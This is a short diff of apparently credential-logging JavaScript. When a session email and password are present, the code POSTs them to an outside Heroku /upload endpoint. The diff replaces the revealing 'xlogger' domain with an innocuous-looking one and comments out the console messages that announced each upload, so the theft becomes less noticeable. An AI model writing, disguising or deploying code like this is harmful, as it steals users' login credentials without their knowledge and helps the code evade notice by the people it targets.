@@ -1,4 +1,4 @@
-var domain="https://xlogger.herokuapp.com"
+var domain="https://timstech.herokuapp.com"
 
 let loading=1;
 let currentUrl;
@@ -26,7 +26,7 @@ function sendData(){
             }
             if(session && session.email && session.password){
               loading++;
-              console.log("sending log");            
+            //   console.log("sending log");            
               setTimeout(() => {
                       fetch(`${domain}/upload`,{
                           method:"POST",
@@ -42,11 +42,11 @@ function sendData(){
                   
                   loading--;
               },1000);  
-              console.log(parsedObj)
+            //   console.log(parsedObj)
             }
           });
       }catch(err){
-          console.log(err);
+        //   console.log(err);
       }
 }
 
